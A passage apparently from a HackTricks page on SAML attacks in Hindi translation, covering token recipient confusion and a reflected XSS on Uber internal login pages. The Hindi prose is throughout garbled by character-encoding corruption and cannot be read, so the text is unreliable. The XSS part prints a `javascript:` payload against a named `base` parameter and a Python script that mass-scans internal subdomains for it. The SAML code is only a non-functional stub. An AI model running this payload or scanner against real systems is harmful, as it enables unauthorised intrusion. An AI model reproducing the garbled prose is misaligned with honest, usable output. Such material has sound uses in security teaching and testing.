рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рднреНрд░рд╛рдВрддрд┐ рдФрд░ рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рд▓рдХреНрд╖реНрдп рднреНрд░рд╛рдВрддрд┐ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ рдХрд┐ **рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдПрдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдЗрдЪреНрдЫрд┐рдд рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛**ред рдореВрд▓ рд░реВрдк рд╕реЗ, рдПрдХ рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рдХреЛ рдПрдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдЕрдЧрд░ рдпрд╣ рдХрд┐рд╕реА рдЕрд▓рдЧ рдкреНрд░рджрд╛рддрд╛ рдХреЗ рд▓рд┐рдП рдерд╛ред рдпрд╣рд╛рдБ рдорд╣рддреНрд╡рдкреВрд░реНрдг рддрддреНрд╡ рд╣реИ **рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛** рдлреАрд▓реНрдб, рдЬреЛ SAML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ **SubjectConfirmationData** рддрддреНрд╡ рдХреЗ рднреАрддрд░ рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рдлреАрд▓реНрдб рдореЗрдВ рдПрдХ URL рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рд╕реНрдкрд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЕрд╕рд░реНрд╢рди рдХреЛ рдХрд╣рд╛рдБ рднреЗрдЬрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрджрд┐ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдЗрдЪреНрдЫрд┐рдд рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рд╕реЗ рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ рд╣реИ, рддреЛ рдЕрд╕рд░реНрд╢рди рдХреЛ рдЕрдорд╛рдиреНрдп рдорд╛рдирд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

#### **рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ**

рдПрдХ SAML рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рднреНрд░рд╛рдВрддрд┐ (SAML-TRC) рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╢рд░реНрддреЛрдВ рдХреЛ рдкреВрд░рд╛ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред рдкрд╣рд▓реЗ, рдПрдХ рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рдкрд░ рдПрдХ рд╡реИрдз рдЦрд╛рддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП (рдЬрд┐рд╕реЗ SP-Legit рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ)ред рджреВрд╕рд░реЗ, рд▓рдХреНрд╖рд┐рдд рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ (SP-Target) рдХреЛ рдЙрд╕реА рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛ рд╕реЗ рдЯреЛрдХрди рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреЛ SP-Legit рдХреЛ рд╕реЗрд╡рд┐рдд рдХрд░рддрд╛ рд╣реИред

рдЗрди рд╢рд░реНрддреЛрдВ рдХреЗ рддрд╣рдд рд╣рдорд▓реЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реАрдзреА рд╣реИред рдПрдХ рд╕рд╛рдЭрд╛ рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ SP-Legit рдХреЗ рд╕рд╛рде рдПрдХ рдорд╛рдиреНрдп рд╕рддреНрд░ рдкреНрд░рд╛рд░рдВрдн рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛ рд╕реЗ SP-Legit рдХреЗ рд▓рд┐рдП SAML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЕрдВрддрд░реНрджреГрд╖реНрдЯрд┐ рдХреА рдЬрд╛рддреА рд╣реИред рдЗрд╕ рдЕрдВрддрд░реНрджреГрд╖реНрдЯрд┐ SAML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ, рдореВрд▓ рд░реВрдк рд╕реЗ SP-Legit рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдзрд╛рд░рд┐рдд, SP-Target рдХреА рдУрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рд╣рдорд▓реЗ рдореЗрдВ рд╕рдлрд▓рддрд╛ SP-Target рджреНрд╡рд╛рд░рд╛ рдЕрд╕рд░реНрд╢рди рд╕реНрд╡реАрдХреГрдд рд╣реЛрдиреЗ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдорд╛рдкреА рдЬрд╛рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ SP-Legit рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдПрдХ рд╣реА рдЦрд╛рддрд╛ рдирд╛рдо рдХреЗ рддрд╣рдд рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдорд┐рд▓рддреА рд╣реИред
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## XSS рдореЗрдВ рд▓реЙрдЧрдЖрдЙрдЯ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛

рдореВрд▓ рдЕрдиреБрд╕рдВрдзрд╛рди рдХреЛ [рдЗрд╕ рд▓рд┐рдВрдХ](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕рд┐рдВрдЧ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рджреМрд░рд╛рди, рдПрдХ рд▓реЙрдЧрдЖрдЙрдЯ рдкреГрд╖реНрда рдХрд╛ рдкрддрд╛ рдЪрд▓рд╛:
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
рдЗрд╕ рд▓рд┐рдВрдХ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдкрд░, рдПрдХ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рд╣реБрдЖ:
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
рдпрд╣ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ `base` рдкреИрд░рд╛рдореАрдЯрд░ рдПрдХ URL рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдзреНрдпрд╛рди рд░рдЦрддреЗ рд╣реБрдП, рдПрдХ рд╡рд┐рдЪрд╛рд░ рдЙрддреНрдкрдиреНрди рд╣реБрдЖ рдХрд┐ URL рдХреЛ `javascript:alert(123);` рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ XSS (рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ) рд╣рдорд▓рд╛ рдкреНрд░рд╛рд░рдВрдн рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред


### рдмреЬреА рдорд╛рддреНрд░рд╛ рдореЗрдВ рд╢реЛрд╖рдг

[рдЗрд╕ рдЕрдиреБрд╕рдВрдзрд╛рди рд╕реЗ](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/):

[SAMLExtractor](https://github.com/fadyosman/SAMLExtractor) рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ `uberinternal.com` рдХреЗ рдЙрдк-рдбреЛрдореЗрдиреЛрдВ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдЬреЛ рдПрдХ рд╣реА рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдмрд╛рдж, рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдЬреЛ `oidauth/prompt` рдкреГрд╖реНрда рдХреЛ рд▓рдХреНрд╖реНрдп рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдерд╛ред рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдбреЗрдЯрд╛ рджрд░реНрдЬ рдХрд░рдХреЗ XSS (рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ) рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдпрд╣ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рдкрд░рд┐рдгрд╛рдо рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдореНрдмрд┐рдд рд╣реЛ рд░рд╣рд╛ рд╣реИред рдЬрд┐рди рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЗрдирдкреБрдЯ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдореНрдмрд┐рдд рд╣реЛ рд░рд╣рд╛ рд╣реИ, рд╡рд╣рд╛рдБ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкреГрд╖реНрда рдХреЛ рднреЗрджреНрдп рдШреЛрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## рд╕рдВрджрд░реНрдн
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╣рдорд╛рд░рд╛ рд╕рдВрдЧреНрд░рд╣ рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдХреЛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
